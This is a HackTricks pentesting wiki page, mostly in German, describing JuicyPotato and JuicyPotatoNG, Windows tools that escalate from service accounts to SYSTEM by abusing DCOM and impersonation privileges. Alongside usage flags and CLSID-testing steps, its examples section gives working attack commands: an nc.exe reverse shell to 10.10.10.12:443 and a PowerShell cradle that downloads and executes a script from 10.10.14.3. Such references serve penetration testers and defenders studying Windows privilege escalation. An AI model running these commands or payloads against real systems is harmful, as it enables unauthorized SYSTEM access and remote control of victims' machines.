# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato ist veraltet. Es funktioniert in der Regel auf Windows-Versionen bis Windows 10 1803 / Windows Server 2016. Änderungen von Microsoft, die ab Windows 10 1809 / Server 2019 ausgeliefert wurden, haben die ursprüngliche Technik gebrochen. Für diese und neuere Builds sollten moderne Alternativen wie PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato und andere in Betracht gezogen werden. Siehe die untenstehende Seite für aktuelle Optionen und Nutzung.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (Ausnutzung der "goldenen" Privilegien) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Kompatibilitäts-Kurznotizen

- Funktioniert zuverlässig bis Windows 10 1803 und Windows Server 2016, wenn der aktuelle Kontext SeImpersonatePrivilege oder SeAssignPrimaryTokenPrivilege besitzt.
- Durch Microsoft-Härtungen in Windows 10 1809 / Windows Server 2019 und neuer gebrochen. Bevorzuge die oben verlinkten Alternativen für diese Builds.

### Zusammenfassung <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Wir entschieden uns, [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) zu weaponisieren: **Begrüßt Juicy Potato**.

> Für die Theorie siehe [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) und folge der Kette von Links und Referenzen.

Wir entdeckten, dass es neben `BITS` mehrere COM-Server gibt, die wir missbrauchen können. Sie müssen lediglich:

1. vom aktuellen Benutzer instanziierbar sein, normalerweise ein "Service-Benutzer", der Impersonationsrechte besitzt
2. das `IMarshal`-Interface implementieren
3. als ein erhöhtes Konto laufen (SYSTEM, Administrator, …)

Nach einigen Tests haben wir eine umfangreiche Liste interessanter [CLSID’s](http://ohpe.it/juicy-potato/CLSID/) auf mehreren Windows-Versionen ermittelt und getestet.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato erlaubt dir:

- **Target CLSID** _wähle beliebiges CLSID aus, das du willst._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _findest du die Liste nach OS sortiert._
- **COM Listening port** _definiere den COM-Listening-Port, den du bevorzugst (anstatt des gemarshalten hardcodierten 6666)_
- **COM Listening IP address** _binde den Server an eine beliebige IP_
- **Process creation mode** _je nach den Rechten des impersonierten Benutzers kannst du wählen zwischen:_
- `CreateProcessWithToken` (benötigt `SeImpersonate`)
- `CreateProcessAsUser` (benötigt `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _starte ein ausführbares Programm oder Skript, falls die Ausnutzung erfolgreich ist_
- **Process Argument** _passe die Argumente des gestarteten Prozesses an_
- **RPC Server address** _für einen stealthy Ansatz kannst du dich an einen externen RPC-Server authentifizieren_
- **RPC Server port** _nützlich, wenn du dich an einen externen Server authentifizieren willst und die Firewall Port `135` blockiert…_
- **TEST mode** _hauptsächlich zu Testzwecken, z.B. zum Testen von CLSIDs. Es erstellt das DCOM und gibt den Benutzer des Tokens aus. Siehe_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Abschließende Gedanken <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.

Es ist nahezu unmöglich, den Missbrauch all dieser COM Servers zu verhindern. Man könnte darüber nachdenken, die Berechtigungen dieser Objekte über `DCOMCNFG` zu ändern, aber viel Glück — das wird herausfordernd.

Die eigentliche Lösung besteht darin, sensible Konten und Anwendungen zu schützen, die unter den `* SERVICE`-Konten laufen. Das Abschalten von `DCOM` würde diesen Exploit zwar behindern, könnte aber schwerwiegende Auswirkungen auf das zugrunde liegende Betriebssystem haben.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:
- DCOM OXID-Auflösung zu einem lokalen RPC-Server auf einem gewählten Port, wodurch der alte fest kodierte 127.0.0.1:6666-Listener vermieden wird.
- Ein SSPI-Hook, um die eingehende SYSTEM-Authentifizierung abzufangen und zu impersonaten, ohne RpcImpersonateClient zu benötigen, was außerdem CreateProcessAsUser ermöglicht, wenn nur SeAssignPrimaryTokenPrivilege vorhanden ist.
- Tricks, um DCOM-Aktivierungsbeschränkungen zu erfüllen (z. B. die frühere INTERACTIVE-Gruppenanforderung beim Anvisieren der PrintNotify- / ActiveX Installer Service-Klassen).

Wichtige Hinweise (sich entwickelndes Verhalten über verschiedene Builds):
- September 2022: Die initiale Technik funktionierte auf unterstützten Windows 10/11- und Server-Zielen unter Verwendung des “INTERACTIVE trick”.
- Januar 2023 Update der Autoren: Microsoft hat später den INTERACTIVE trick blockiert. Eine andere CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) stellt die Ausnutzung wieder her, jedoch laut ihrem Beitrag nur auf Windows 11 / Server 2022.

Grundlegende Verwendung (mehr Flags in der Hilfe):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Wenn du Windows 10 1809 / Server 2019 ins Visier nimmst, wo der klassische JuicyPotato gepatcht wurde, verwende vorzugsweise die oben verlinkten Alternativen (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG kann je nach Build- und Service-Zustand situationsabhängig sein.

## Beispiele

Hinweis: Besuche [this page](https://ohpe.it/juicy-potato/CLSID/) für eine Liste von CLSIDs zum Ausprobieren.

### nc.exe reverse shell bekommen
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Starte ein neues CMD (wenn du RDP-Zugang hast)

![](<../../images/image (300).png>)

## CLSID-Probleme

Oft funktioniert die standardmäßige CLSID, die JuicyPotato verwendet, **nicht** und der Exploit schlägt fehl. Meist sind mehrere Versuche nötig, um eine **funktionierende CLSID** zu finden. Um eine Liste von CLSIDs für ein bestimmtes Betriebssystem zu erhalten, solltest du diese Seite besuchen:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID prüfen**

Zuerst benötigst du einige ausführbare Dateien neben juicypotato.exe.

Lade [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) herunter und lade es in deine PS-Sitzung, und lade und führe [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) aus. Dieses Skript erstellt eine Liste möglicher CLSIDs zum Testen.

Lade dann [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(ändere den Pfad zur CLSID-Liste und zur juicypotato-Executable) herunter und führe es aus. Es wird jede CLSID durchprobieren, und **wenn sich die Portnummer ändert, bedeutet das, dass die CLSID funktioniert hat**.

**Prüfe** die funktionierenden CLSIDs **mit dem Parameter -c**

## Referenzen

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
